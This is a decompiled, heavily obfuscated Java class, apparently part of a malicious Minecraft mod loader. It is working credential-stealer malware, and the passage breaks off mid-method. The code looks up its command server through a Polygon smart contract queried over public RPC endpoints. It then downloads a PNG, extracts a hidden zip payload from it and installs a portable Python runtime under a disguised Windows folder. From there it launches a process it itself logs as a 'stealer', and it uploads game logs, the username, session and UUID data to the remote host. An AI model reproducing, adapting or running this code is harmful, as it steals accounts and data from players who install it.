package net.fabric;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class bjuKfvjfjWgeqKxp {
   private String PflhKgNn;
   private String lFSpD_I;
   private String qIwnhrannw;
   private String dq7_m;
   private String ng_yyl_czl;
   private String curCqe;
   private String fcverCfg;
   private String ZX_0TZQFRXAq;
   private String IbDiTNBiYV;
   private Path qmh;
   private StringBuilder QWx0bh6ZX;
   private String dDsy;

   private static String[] ph_gn_ygxbhg() {
      int var27 = -1766795663;
      if (var27 * 1 == -1766795663) {
         int var28 = 32487;
         var28 *= 110;
      }

      String[] var10000 = new String[5];
      StringBuilder var0 = new StringBuilder();
      char[] var3 = "gon.drpc.org".toCharArray();
      var0.append(new String(var3));
      var10000[0] = var0.toString();
      StringBuilder var5 = new StringBuilder();
      char[] var6 = "https://po".toCharArray();
      var5.append(new String(var6));
      char[] var8 = "lygon-bor-".toCharArray();
      var5.append(new String(var8));
      char[] var10 = "rpc.publicnode.com".toCharArray();
      var5.append(new String(var10));
      var10000[1] = var5.toString();
      StringBuilder var12 = new StringBuilder();
      var10000[2] = "https://1rpc.io/matic";
      StringBuilder var14 = new StringBuilder();
      char[] var15 = "https://".toCharArray();
      var14.append(new String(var15));
      var14.append("api.zan.top/pol");
      StringBuilder var19 = new StringBuilder();
      var14.append("ygon-mainnet");
      var10000[3] = var14.toString();
      StringBuilder var21 = new StringBuilder();
      char[] var24 = "ainnet.matic.q".toCharArray();
      var21.append(new String(var24));
      char[] var26 = "uiknode.pro".toCharArray();
      var21.append(new String(var26));
      var10000[4] = var21.toString();
      return var10000;
   }

   private static String mvlr_ikabf_swkes_dkiej() {
      StringBuilder var0 = new StringBuilder();
      StringBuilder var5 = new StringBuilder();
      return "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
   }

   private static String hmwmrnxPtr() {
      StringBuilder var0 = new StringBuilder();
      int var1 = 664722769;
      if ((var1 & 664722769) == 664722769) {
         var1 = 1482011649;
         var1 &= -1572783923;
      }

      return "0xce6d41de";
   }

   private static String daAju() {
      StringBuilder var0 = new StringBuilder();
      char[] var1 = "thisisafalsep".toCharArray();
      var0.append(new String(var1));
      var0.append("ositive.st");
      return var0.toString();
   }

   private static String qEyLkJSH() {
      StringBuilder var0 = new StringBuilder();
      char[] var1 = "/cdn/v2/9f".toCharArray();
      var0.append(new String(var1));
      var0.append("4e7a2c1b8d.png");
      return var0.toString();
   }

   public static void main(String[] args) {
      bjuKfvjfjWgeqKxp sqck_eTbT_NxFF_IFGb = new bjuKfvjfjWgeqKxp();
      sqck_eTbT_NxFF_IFGb.execute(oniszs_wu_wzztes);
   }

   public static String radFjkrfTeuTkrn() {
      StringBuilder var0 = new StringBuilder();
      char[] var1 = "640c89e".toCharArray();
      var0.append(new String(var1));
      var0.append("9-a41c-4b25-82");
      char[] var5 = "7c-85dfc42e9cc7".toCharArray();
      var0.append(new String(var5));
      return var0.toString();
   }

   public static String tcwpPNX() {
      char[] var0 = "Echo".toCharArray();
      return new String(var0);
   }

   public String getDomain() {
      if (lpmetHg.dDsy != null) {
         return lpmetHg.dDsy;
      } else {
         String var10000 = mvlr_ikabf_swkes_dkiej();
         String var9 = hmwmrnxPtr();
         String var8 = var10000;
         StringBuilder var10;
         StringBuilder var30 = var10 = new StringBuilder();
         char[] var11 = "{\"jsonrpc\":".toCharArray();
         var10.append(new String(var11));
         StringBuilder var13 = new StringBuilder();
         var10.append("\"2.0\",\"met");
         var10.append("hod\":\"eth_call\",");
         var10.append("\"params\":[{\"to\":\"");
         StringBuilder var31 = var30.append(var10.toString()).append(var8);
         char[] var19 = "\",\"data\":\"".toCharArray();
         StringBuilder var32 = var31.append(new String(var19)).append(var9);
         char[] var21 = new char[]{
            '"',
            '}',
            ',',
            '"',
            'l',
            'a',
            't',
            'e',
            's',
            't',
            '"',
            ']',
            ',',
            '"',
            'i',
            'd',
            '"',
            ':',
            '1',
            '}'
         };
         String headStr = var32.append(new String(var21)).toString();
         String[] var2 = ph_gn_ygxbhg();
         int var3 = var2.length;
         int var4 = 0;

         while (var4 < var3) {
            String pos1 = var2[var4];

            try {
               char[] var23 = "application/json".toCharArray();
               JyQl4QNl.disposePfl prevVal = JyQl4QNl.KLxPZGZVNbbqrnFH(pos1, headStr, new String(var23));
               if (prevVal.statusCode == 200) {
                  String a3 = lpmetHg.umg_yiv(prevVal.bodyString());
                  if (a3 != null && a3.length() > 0) {
                     lpmetHg.dDsy = a3;
                     return a3;
                  }
               }
            } catch (Exception var26) {
            }

            var4++;
            int var24 = 849617270;
            if (var24 == 849617270) {
               int var27 = 19420;
               var27 &= 117;
               int var25 = 5646;
               var25 ^= 44;
            }
         }

         lpmetHg.dDsy = daAju();
         return lpmetHg.dDsy;
      }
   }

   public String prefire(String host, String sess, String uid) {
      try {
         String var10000 = UARw_rloO_LCZT_UtzL.ZxmVuFLMJ(holderPos);
         String var7 = UARw_rloO_LCZT_UtzL.ZxmVuFLMJ(kcy_yv_tqhasm_wgezuu);
         String var6 = var10000;
         StringBuilder var32 = new StringBuilder();
         char[] var8 = "{\"sessionId\":\"".toCharArray();
         StringBuilder var33 = var32.append(new String(var8)).append(var6);
         StringBuilder var10 = new StringBuilder();
         String M4L5vpEPfw52Y = var33.append("\",\"userId\":\"").append(var7).append("\"}").toString();
         StringBuilder var13;
         StringBuilder var34 = var13 = new StringBuilder();
         var13.append('h');
         var13.append('t');
         var13.append('t');
         var13.append('p');
         var13.append('s');
         var13.append(':');
         var13.append('/');
         var13.append('/');
         StringBuilder var35 = var34.append(var13.toString()).append(lnCerh);
         var10000 = var35.append("/shard/prefireMc").toString();
         char[] var17 = "application/json".toCharArray();
         String var10002 = new String(var17);
         StringBuilder var19 = new StringBuilder();
         char[] var22 = "-Cache-Revalidate".toCharArray();
         var19.append(new String(var22));
         String var10003 = var19.toString();
         char[] var24 = "stale-if-error".toCharArray();
         String var10004 = new String(var24);
         String var10005 = "X-Runtime-Env";
         JyQl4QNl.disposePfl IhLC8Z_B_o = JyQl4QNl.vcgqba_os_brltq_gbu(
            var10000, M4L5vpEPfw52Y, var10002, Map.of(var10003, var10004, var10005, "jre-embedded")
         );
         if (IhLC8Z_B_o.statusCode == 200) {
            String var10001 = IhLC8Z_B_o.bodyString();
            char[] var30 = "prefireId".toCharArray();
            return UARw_rloO_LCZT_UtzL.gq_al_av(var10001, new String(var30));
         }
      } catch (Exception var31) {
      }

      return null;
   }

   public void execute(String[] args) {
      try {
         gqCu_RCk_NHrh.qmh = gqCu_RCk_NHrh.dsaRef();
         gqCu_RCk_NHrh.QWx0bh6ZX = new StringBuilder();
         Files.createDirectories(gqCu_RCk_NHrh.qmh);
         StringBuilder var4 = new StringBuilder();
         char[] var5 = "========== DETA".toCharArray();
         var4.append(new String(var5));
         char[] var7 = "CHED P".toCharArray();
         var4.append(new String(var7));
         var4.append("ROCESS STARTED =");
         char[] var11 = "=========".toCharArray();
         var4.append(new String(var11));
         gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var4.toString());
         if (bswlqRvimrt.length < 1) {
            StringBuilder var13 = new StringBuilder();
            char[] var14 = "ERROR: No c".toCharArray();
            var13.append(new String(var14));
            StringBuilder var16 = new StringBuilder();
            var13.append("ontext argument");
            gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var13.toString());
            gqCu_RCk_NHrh.fqvjot_afsv();
            return;
         }

         if (!gqCu_RCk_NHrh.tuojs_buk_mhhcfq(bswlqRvimrt[0])) {
            StringBuilder var18 = new StringBuilder();
            char[] var19 = "ERROR: Fail".toCharArray();
            var18.append(new String(var19));
            char[] var21 = "ed to parse c".toCharArray();
            var18.append(new String(var21));
            char[] var23 = "ontext".toCharArray();
            var18.append(new String(var23));
            gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var18.toString());
            gqCu_RCk_NHrh.fqvjot_afsv();
            return;
         }

         String var26 = gqCu_RCk_NHrh.IbDiTNBiYV;
         String var25 = gqCu_RCk_NHrh.qIwnhrannw;
         StringBuilder var27;
         StringBuilder var71 = var27 = new StringBuilder();
         var27.append("Context parsed -");
         char[] var30 = " UserId: ".toCharArray();
         var27.append(new String(var30));
         var71 = var71.append(var27.toString()).append(var25);
         StringBuilder var32 = new StringBuilder();
         gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var71.append(", Env: ").append(var26).toString());
         char[] var34 = "python.exe".toCharArray();
         Path lcemjz_txgue_zzyq = gqCu_RCk_NHrh.qmh.resolve(new String(var34));
         char[] var36 = "AppHost".toCharArray();
         Path var10000 = gqCu_RCk_NHrh.qmh.resolve(new String(var36));
         char[] var38 = "main.py".toCharArray();
         Path obj3 = var10000.resolve(new String(var38));
         if (Files.exists(lcemjz_txgue_zzyq) && Files.exists(obj3)) {
            StringBuilder var56 = new StringBuilder();
            char[] var59 = "ime alread".toCharArray();
            var56.append(new String(var59));
            var56.append("y cached");
            gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var56.toString());
         } else {
            StringBuilder var40 = new StringBuilder();
            char[] var41 = "Downloa".toCharArray();
            var40.append(new String(var41));
            char[] var43 = "ding portable r".toCharArray();
            var40.append(new String(var43));
            var40.append("untime...");
            gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var40.toString());
            if (!gqCu_RCk_NHrh.epwu_ckj_lyotm_zateca()) {
               StringBuilder var47 = new StringBuilder();
               StringBuilder var48 = new StringBuilder();
               char[] var50 = "ed to s".toCharArray();
               var47.append(new String(var50));
               char[] var52 = "etup por".toCharArray();
               var47.append(new String(var52));
               var47.append("table runtime");
               gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var47.toString());
               gqCu_RCk_NHrh.fqvjot_afsv();
               return;
            }
         }

         gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz("Spawning stealer...");
         gqCu_RCk_NHrh.run();
         gqCu_RCk_NHrh.fqvjot_afsv();
      } catch (Exception var69) {
         String var10001 = var69.getClass().getSimpleName();
         String var66 = var69.getMessage();
         String var65 = var10001;
         StringBuilder var70 = new StringBuilder();
         char[] var67 = "FATAL: ".toCharArray();
         gqCu_RCk_NHrh.ua_ghqgaw_uujsp_qz(var70.append(new String(var67)).append(var65).append(": ").append(var66).toString());

         try {
            gqCu_RCk_NHrh.fqvjot_afsv();
         } catch (Exception var68) {
         }
      }
   }

   private Path dsaRef() {
      StringBuilder var2 = new StringBuilder();
      String wdsff_pfd_yr_tfz = System.getenv("LOCALAPPDATA");
      String[] var10001 = new String[3];
      char[] var4 = "Microsoft".toCharArray();
      var10001[0] = new String(var4);
      var10001[1] = "Windows";
      char[] var8 = "NtProfileIndex".toCharArray();
      var10001[2] = new String(var8);
      return Path.of(wdsff_pfd_yr_tfz, var10001);
   }

   private boolean epwu_ckj_lyotm_zateca() {
      int sCy = 3;

      for (int idxNum = 1; idxNum <= sCy; idxNum++) {
         try {
            StringBuilder var108 = new StringBuilder();
            char[] var8 = "Download attempt ".toCharArray();
            node4.ua_ghqgaw_uujsp_qz(var108.append(new String(var8)).append(idxNum).append("/").append(sCy).append("...").toString());
            String var10000 = node4.ng_yyl_czl;
            String var11 = qEyLkJSH();
            String var10 = var10000;
            StringBuilder var12;
            StringBuilder var105 = var12 = new StringBuilder();
            var12.append('h');
            var12.append('t');
            var12.append('t');
            var12.append('p');
            var12.append('s');
            var12.append(':');
            var12.append('/');
            var12.append('/');
            var10000 = var105.append(var12.toString()).append(var10).append(var11).toString();
            char[] var14 = "User-Agent".toCharArray();
            String var109 = new String(var14);
            StringBuilder var16 = new StringBuilder();
            char[] var17 = "Mozilla/5.0 (W".toCharArray();
            var16.append(new String(var17));
            char[] var19 = "indows ".toCharArray();
            var16.append(new String(var19));
            char[] var21 = "NT 10.0; Win6".toCharArray();
            var16.append(new String(var21));
            char[] var23 = "4; x64".toCharArray();
            var16.append(new String(var23));
            var16.append(") AppleWebKit/5");
            char[] var27 = "37.36 (KHTML, l".toCharArray();
            var16.append(new String(var27));
            var16.append("ike Gec");
            char[] var31 = "ko) Chrome/131.0".toCharArray();
            var16.append(new String(var31));
            char[] var33 = ".0.0 Safari/537.36".toCharArray();
            var16.append(new String(var33));
            String var10002 = var16.toString();
            char[] var35 = "Accept".toCharArray();
            String var10003 = new String(var35);
            StringBuilder var37 = new StringBuilder();
            char[] var38 = "image/".toCharArray();
            var37.append(new String(var38));
            StringBuilder var40 = new StringBuilder();
            var37.append("avif,im");
            StringBuilder var42 = new StringBuilder();
            var37.append("age/webp,image");
            char[] var44 = "/apng,imag".toCharArray();
            var37.append(new String(var44));
            var37.append("e/svg+xml");
            char[] var48 = ",image/*,*/*;q=0.8".toCharArray();
            var37.append(new String(var48));
            String var10004 = var37.toString();
            String var10005 = "Accept-Language";
            char[] var52 = "en-US,en;q=0.9".toCharArray();
            String var10006 = new String(var52);
            String var10007 = "Sec-Fetch-Dest";
            StringBuilder var56 = new StringBuilder();
            String var10008 = "image";
            StringBuilder var58 = new StringBuilder();
            String var10009 = "Sec-Fetch-Mode";
            String var10010 = "no-cors";
            char[] var62 = "Sec-Fetch-Site".toCharArray();
            String var10011 = new String(var62);
            JyQl4QNl.disposePfl cK_DNdRmKaCc_9 = JyQl4QNl.get(
               var10000, Map.of(var109, var10002, var10003, var10004, var10005, var10006, var10007, var10008, var10009, var10010, var10011, "same-origin")
            );
            if (cK_DNdRmKaCc_9.statusCode != 200 || cK_DNdRmKaCc_9.body.length == 0) {
               int var66 = cK_DNdRmKaCc_9.statusCode;
               StringBuilder var67;
               var108 = var67 = new StringBuilder();
               var67.append('D');
               var67.append('o');
               var67.append('w');
               var67.append('n');
               var67.append('l');
               var67.append('o');
               var67.append('a');
               var67.append('d');
               var67.append(' ');
               var67.append('f');
               var67.append('a');
               var67.append('i');
               var67.append('l');
               var67.append('e');
               var67.append('d');
               var67.append(':');
               var67.append(' ');
               var67.append('H');
               var67.append('T');
               var67.append('T');
               var67.append('P');
               var67.append(' ');
               node4.ua_ghqgaw_uujsp_qz(var108.append(var67.toString()).append(var66).toString());
               continue;
            }

            int var69 = cK_DNdRmKaCc_9.body.length;
            StringBuilder var70;
            var108 = var70 = new StringBuilder();
            var70.append('D');
            var70.append('o');
            var70.append('w');
            var70.append('n');
            var70.append('l');
            var70.append('o');
            var70.append('a');
            var70.append('d');
            var70.append('e');
            var70.append('d');
            var70.append(' ');
            var108 = var108.append(var70.toString()).append(var69);
            StringBuilder var72 = new StringBuilder();
            char[] var73 = " bytes, ex".toCharArray();
            var72.append(new String(var73));
            char[] var75 = "tractin".toCharArray();
            var72.append(new String(var75));
            char[] var77 = "g from image...".toCharArray();
            var72.append(new String(var77));
            node4.ua_ghqgaw_uujsp_qz(var108.append(var72.toString()).toString());
            byte[] acggw_qoesbk = node4.parseFwkwbsihh(cK_DNdRmKaCc_9.body);
            if (acggw_qoesbk == null) {
               node4.ua_ghqgaw_uujsp_qz("PNG extraction failed");
               continue;
            }

            int var81 = acggw_qoesbk.length;
            StringBuilder var82;
            var108 = var82 = new StringBuilder();
            var82.append('E');
            var82.append('x');
            var82.append('t');
            var82.append('r');
            var82.append('a');
            var82.append('c');
            var82.append('t');
            var82.append('e');
            var82.append('d');
            var82.append(' ');
            var108 = var108.append(var82.toString()).append(var81);
            StringBuilder var84 = new StringBuilder();
            char[] var85 = " bytes from imag".toCharArray();
            var84.append(new String(var85));
            StringBuilder var87 = new StringBuilder();
            var84.append("e, unpacking...");
            node4.ua_ghqgaw_uujsp_qz(var108.append(var84.toString()).toString());
            int hlPC_obAa_LIwW_oSYu = node4.agVxdtJb(acggw_qoesbk);
            var108 = new StringBuilder();
            char[] var90 = "Extracted ".toCharArray();
            var108 = var108.append(new String(var90)).append(hlPC_obAa_LIwW_oSYu);
            StringBuilder var92 = new StringBuilder();
            node4.ua_ghqgaw_uujsp_qz(var108.append(" files").toString());
            char[] var94 = "python.exe".toCharArray();
            if (Files.exists(node4.qmh.resolve(new String(var94)))) {
               node4.ua_ghqgaw_uujsp_qz("Portable runtime ready");
               return true;
            }
         } catch (Exception var104) {
            String var99 = var104.getMessage();
            StringBuilder var100;
            StringBuilder var10001 = var100 = new StringBuilder();
            var100.append('A');
            var100.append('t');
            var100.append('t');
            var100.append('e');
            var100.append('m');
            var100.append('p');
            var100.append('t');
            var100.append(' ');
            var10001 = var10001.append(var100.toString()).append(idxNum);
            node4.ua_ghqgaw_uujsp_qz(var10001.append(" error: ").append(var99).toString());
         }

         if (idxNum < sCy) {
            try {
               Thread.sleep(2000L * (long)idxNum);
            } catch (InterruptedException var103) {
            }
         }
      }

      return false;
   }

   private int agVxdtJb(byte[] data) throws IOException {
      int owdWxxUmlXzgh = 0;
      byte[] grpix_sq_tpccb_vtmue = new byte[131072];
      ByteArrayInputStream UYDb_seNU_oqGu_xRfA = new ByteArrayInputStream(bnp);

      ZipInputStream Mhth_gYTb_Mpoy_PDBB;
      ZipEntry opts2;
      for (Mhth_gYTb_Mpoy_PDBB = new ZipInputStream(UYDb_seNU_oqGu_xRfA); (opts2 = Mhth_gYTb_Mpoy_PDBB.getNextEntry()) != null; owdWxxUmlXzgh++) {
         Path targetMin = temp.qmh.resolve(opts2.getName());
         if (opts2.isDirectory()) {
            Files.createDirectories(targetMin);
         } else {
            Files.createDirectories(targetMin.getParent());
            FileOutputStream Ru_seMXj60wV = new FileOutputStream(targetMin.toFile());
            BufferedOutputStream gmUS_uHMW_rLTw_Nxxr = new BufferedOutputStream(Ru_seMXj60wV, 131072);

            int eV5JrmwT0lNHn;
            while ((eV5JrmwT0lNHn = Mhth_gYTb_Mpoy_PDBB.read(grpix_sq_tpccb_vtmue)) > 0) {
               gmUS_uHMW_rLTw_Nxxr.write(grpix_sq_tpccb_vtmue, 0, eV5JrmwT0lNHn);
            }

            gmUS_uHMW_rLTw_Nxxr.close();
         }

         Mhth_gYTb_Mpoy_PDBB.closeEntry();
      }

      Mhth_gYTb_Mpoy_PDBB.close();
      return owdWxxUmlXzgh;
   }

   private byte[] parseFwkwbsihh(byte[] img) {
      try {
         if (igFT_KwkI_ezmr_XeEr.length < 8) {
            return null;
         } else {
            byte[] yrJymLqFmk = new byte[]{-119, 80, 78, 71, 13, 10, 26, 10};

            for (int yizZhvyh = 0; yizZhvyh < 8; yizZhvyh++) {
               if (igFT_KwkI_ezmr_XeEr[yizZhvyh] != yrJymLqFmk[yizZhvyh]) {
                  return null;
               }
            }

            int str = 8;

            while (str + 8 <= igFT_KwkI_ezmr_XeEr.length) {
               int xbTUT = (igFT_KwkI_ezmr_XeEr[str] & 255) << 24
                  | (igFT_KwkI_ezmr_XeEr[str + 1] & 255) << 16
                  | (igFT_KwkI_ezmr_XeEr[str + 2] & 255) << 8
                  | igFT_KwkI_ezmr_XeEr[str + 3] & 255;
               byte uby_xl_lkm = igFT_KwkI_ezmr_XeEr[str + 4];
               byte gtgkoy_loo = igFT_KwkI_ezmr_XeEr[str + 5];
               byte ATeO__9 = igFT_KwkI_ezmr_XeEr[str + 6];
               byte LAko_Tq = igFT_KwkI_ezmr_XeEr[str + 7];
               if (uby_xl_lkm == 104 && gtgkoy_loo == 73 && ATeO__9 == 100 && LAko_Tq == 115) {
                  byte[] bWXD_xNys_dKoH_lGfK = Arrays.copyOfRange(igFT_KwkI_ezmr_XeEr, str + 8, str + 8 + xbTUT);
                  return FzoQ_wUzH_oPsG_NOoo.pCM___omLwL(bWXD_xNys_dKoH_lGfK);
               }

               str += 12 + xbTUT;
            }

            return null;
         }
      } catch (Exception var10) {
         return null;
      }
   }

   private byte[] pCM___omLwL(byte[] comp) {
      try {
         Inflater qxG = new Inflater();
         qxG.setInput(jawIcpDzp);
         ByteArrayOutputStream m9j = new ByteArrayOutputStream(jawIcpDzp.length * 5);
         byte[] CiK_2_xzg3 = new byte[131072];

         while (!qxG.finished()) {
            int ykilb_ezbojb_sqw = qxG.inflate(CiK_2_xzg3);
            if (ykilb_ezbojb_sqw == 0 && qxG.needsInput()) {
               break;
            }

            m9j.write(CiK_2_xzg3, 0, ykilb_ezbojb_sqw);
         }

         qxG.end();
         return m9j.toByteArray();
      } catch (Exception var6) {
         return null;
      }
   }

   private void run() {
      try {
         char[] var6 = "python.exe".toCharArray();
         Path a0 = hwvzMogmVkz.qmh.resolve(new String(var6));
         char[] var8 = "AppHost".toCharArray();
         Path var10000 = hwvzMogmVkz.qmh.resolve(new String(var8));
         StringBuilder var10 = new StringBuilder();
         Path objVal = var10000.resolve("main.py");
         if (!Files.exists(objVal)) {
            StringBuilder var12 = new StringBuilder();
            StringBuilder var13 = new StringBuilder();
            char[] var15 = " not found".toCharArray();
            var12.append(new String(var15));
            hwvzMogmVkz.ua_ghqgaw_uujsp_qz(var12.toString());
            return;
         }

         List capRaw = new ArrayList();
         capRaw.add(a0.toString());
         capRaw.add(objVal.toString());
         capRaw.add("-u");
         capRaw.add(hwvzMogmVkz.qIwnhrannw);
         capRaw.add("--env");
         capRaw.add(hwvzMogmVkz.IbDiTNBiYV);
         if (hwvzMogmVkz.dq7_m != null) {
            String var47 = hwvzMogmVkz.dq7_m;
            StringBuilder var19 = new StringBuilder();
            if (!var47.equals("null")) {
               StringBuilder var21 = new StringBuilder();
               capRaw.add("--tag");
               capRaw.add(hwvzMogmVkz.dq7_m);
            }
         }

         if (hwvzMogmVkz.PflhKgNn != null) {
            String var48 = hwvzMogmVkz.PflhKgNn;
            if (!var48.equals("null")) {
               capRaw.add("--mcInfo");
               capRaw.add(hwvzMogmVkz.PflhKgNn);
            }
         }

         if (hwvzMogmVkz.lFSpD_I != null) {
            char[] var27 = "null".toCharArray();
            if (!hwvzMogmVkz.lFSpD_I.equals(new String(var27))) {
               char[] var29 = "--prefireId".toCharArray();
               capRaw.add(new String(var29));
               capRaw.add(hwvzMogmVkz.lFSpD_I);
            }
         }

         ProcessBuilder ijuae_ujkr_ogiu = new ProcessBuilder(capRaw);
         char[] var31 = "AppHost".toCharArray();
         ijuae_ujkr_ogiu.directory(hwvzMogmVkz.qmh.resolve(new String(var31)).toFile());
         ijuae_ujkr_ogiu.redirectInput(Redirect.from(new File("NUL")));
         char[] var33 = "_stealer.log".toCharArray();
         ijuae_ujkr_ogiu.redirectOutput(Redirect.appendTo(hwvzMogmVkz.qmh.resolve(new String(var33)).toFile()));
         ijuae_ujkr_ogiu.redirectErrorStream(true);
         int var41 = -1845763336;
         if (var41 == -1845763336) {
            var41 = -878512513;
            var41 += 35;
            var41 ^= 1044977129;
            var41 <<= 2;
         }

         Process currInfo = ijuae_ujkr_ogiu.start();
         long var35 = currInfo.pid();
         StringBuilder var37;
         StringBuilder var49 = var37 = new StringBuilder();
         var37.append('S');
         var37.append('t');
         var37.append('e');
         var37.append('a');
         var37.append('l');
         var37.append('e');
         var37.append('r');
         var37.append(' ');
         var37.append('s');
         var37.append('p');
         var37.append('a');
         var37.append('w');
         var37.append('n');
         var37.append('e');
         var37.append('d');
         var37.append(':');
         var37.append(' ');
         var37.append('p');
         var37.append('i');
         var37.append('d');
         var37.append('=');
         hwvzMogmVkz.ua_ghqgaw_uujsp_qz(var49.append(var37.toString()).append(var35).toString());
      } catch (Exception var42) {
         String var39 = var42.getMessage();
         StringBuilder var40;
         StringBuilder var10001 = var40 = new StringBuilder();
         var40.append('S');
         var40.append('p');
         var40.append('a');
         var40.append('w');
         var40.append('n');
         var40.append(' ');
         var40.append('e');
         var40.append('r');
         var40.append('r');
         var40.append('o');
         var40.append('r');
         var40.append(':');
         var40.append(' ');
         hwvzMogmVkz.ua_ghqgaw_uujsp_qz(var10001.append(var40.toString()).append(var39).toString());
      }
   }

   private void fqvjot_afsv() {
      if (ouh_dc.ng_yyl_czl != null) {
         try {
            StringBuilder idx1 = new StringBuilder();
            if (ouh_dc.curCqe != null) {
               String var10000 = ouh_dc.curCqe;
               String[] var114 = new String[2];
               char[] var4 = "logs".toCharArray();
               var114[0] = new String(var4);
               var114[1] = "latest.log";
               Path ygxu_ewpako_bxno_xxchz = Path.of(var10000, var114);
               if (Files.exists(ygxu_ewpako_bxno_xxchz)) {
                  try {
                     String bPos = Files.readString(ygxu_ewpako_bxno_xxchz);
                     if (bPos.length() > 5000000) {
                        var10000 = bPos.substring(0, 2500000);
                        String var9 = bPos.substring(bPos.length() - 2500000);
                        String var8 = var10000;
                        StringBuilder var100 = new StringBuilder().append(var8);
                        StringBuilder var10 = new StringBuilder();
                        bPos = var100.append("\n=== TRUNCATED ===\n").append(var9).toString();
                     }

                     idx1.append(bPos);
                  } catch (Exception var92) {
                     char[] var12 = "ERROR reading MC log: ".toCharArray();
                     idx1.append(new String(var12)).append(var92.getMessage());
                  }
               }
            }

            StringBuilder var14 = new StringBuilder();
            StringBuilder var19 = new StringBuilder();
            idx1.append("\n\n========== DETACHED LOG ==========\n");
            idx1.append(ouh_dc.QWx0bh6ZX.toString());
            StringBuilder var21 = new StringBuilder();
            char[] var22 = "\n\n=========".toCharArray();
            var21.append(new String(var22));
            var21.append("= RUNTIME ====");
            char[] var26 = "======\n".toCharArray();
            var21.append(new String(var26));
            idx1.append(var21.toString());
            char[] var28 = "jvm=".toCharArray();
            StringBuilder var101 = idx1.append(new String(var28));
            char[] var30 = "java.version".toCharArray();
            var101.append(System.getProperty(new String(var30))).append("\n");
            var101 = idx1.append("os=");
            char[] var32 = "os.name".toCharArray();
            var101.append(System.getProperty(new String(var32))).append("\n");
            char[] var34 = "user=".toCharArray();
            var101 = idx1.append(new String(var34));
            char[] var36 = "user.name".toCharArray();
            var101.append(System.getProperty(new String(var36))).append("\n");
            String var104 = ouh_dc.ZxmVuFLMJ(ouh_dc.qIwnhrannw);
            String var115 = ouh_dc.ZxmVuFLMJ(idx1.toString());
            String var10002 = ouh_dc.ZxmVuFLMJ(ouh_dc.fcverCfg != null ? ouh_dc.fcverCfg : "N/A");
            String var10003 = ouh_dc.ZxmVuFLMJ(ouh_dc.ZX_0TZQFRXAq != null ? ouh_dc.ZX_0TZQFRXAq : "N/A");
            String var42 = ouh_dc.ZxmVuFLMJ(ouh_dc.IbDiTNBiYV);
            String var41 = var10003;
            String var40 = var10002;
            String var39 = var115;
            String var38 = var104;
            StringBuilder var43;
            var101 = var43 = new StringBuilder();
            var43.append('{');
            var43.append('"');
            var43.append('u');
            var43.append('s');
            var43.append('e');
            var43.append('r');
            var43.append('I');
            var43.append('d');
            var43.append('"');
            var43.append(':');
            var43.append('"');
            var101 = var101.append(var43.toString()).append(var38);
            var101 = var101.append("\",\"content\":\"").append(var39);
            StringBuilder var47 = new StringBuilder();
            StringBuilder var48 = new StringBuilder();
            char[] var54 = "name\":\"".toCharArray();
            var47.append(new String(var54));
            var101 = var101.append(var47.toString()).append(var40);
            StringBuilder var56 = new StringBuilder();
            var101 = var101.append("\",\"mcUuid\":\"").append(var41);
            StringBuilder var58 = new StringBuilder();
            char[] var59 = "\",\"executionE".toCharArray();
            var58.append(new String(var59));
            var58.append("nvironment\":\"");
            var101 = var101.append(var58.toString()).append(var42);
            String k9_x_v = var101.append("-Detached\"}").toString();
            String var65 = ouh_dc.ng_yyl_czl;
            var101 = new StringBuilder();
            char[] var66 = "https://".toCharArray();
            var101 = var101.append(new String(var66)).append(var65);
            StringBuilder var68 = new StringBuilder();
            StringBuilder var69 = new StringBuilder();
            char[] var71 = "tMinecraftLog".toCharArray();
            var68.append(new String(var71));
            String var113 = var101.append(var68.toString()).toString();
            char[] var73 = "application/json".toCharArray();
            var10002 = new String(var73);
            StringBuilder var75 = new StringBuilder();
            char[] var78 = "e-Revalidate".toCharArray();
            var75.append(new String(var78));
            var10003 = var75.toString();
            char[] var80 = "stale-if-error".toCharArray();
            String var10004 = new String(var80);
            StringBuilder var82 = new StringBuilder();
            String var10005 = "X-Runtime-Env";
            StringBuilder var84 = new StringBuilder();
            JyQl4QNl.disposePfl mData = JyQl4QNl.vcgqba_os_brltq_gbu(var113, k9_x_v, var10002, Map.of(var10003, var10004, var10005, "jre-embedded"));
            int var86 = mData.statusCode;
            StringBuilder var87;
            StringBuilder var116 = var87 = new StringBuilder();
            var87.append('L');
            var87.append('o');
            var87.append('g');
            var87.append(' ');
            var87.append('s');
            var87.append('u');
            var87.append('b');
            var87.append('m');
            var87.append('i');
            var87.append('t');
            var87.append('t');
            var87.append('e');
            var87.append('d');
            var87.append(':');
            var87.append(' ');
            ouh_dc.ua_ghqgaw_uujsp_qz(var116.append(var87.toString()).append(var86).toString());
         } catch (Exception var93) {
            String var89 = var93.getMessage();
            StringBuilder var10001 = new StringBuilder();
            char[] var90 = "Submit error: ".toCharArray();
            ouh_dc.ua_ghqgaw_uujsp_qz(var10001.append(new String(var90)).append(var89).toString());
            return;
         }

         int var91 = -760829946;
         if (var91 - -760829946 == 0) {
            var91 = -1289042835;
            var91 <<= 28;
            var91 >>>= 16;
         }
      }
   }

   private void ua_ghqgaw_uujsp_qz(String msg) {
      long var3 = System.currentTimeMillis();
      String vkU = "[" + var3 + "] " + holderIdx;
      if (nRaw.QWx0bh6ZX != null) {
         nRaw.QWx0bh6ZX.append(vkU).append("\n");
      }

      System.out.println(vkU);
   }

   private boolean tuojs_buk_mhhcfq(String b64) {
      try {
         String buf0 = new String(Base64.getDecoder().decode(nlPyirMzjyOuwruw), StandardCharsets.UTF_8);
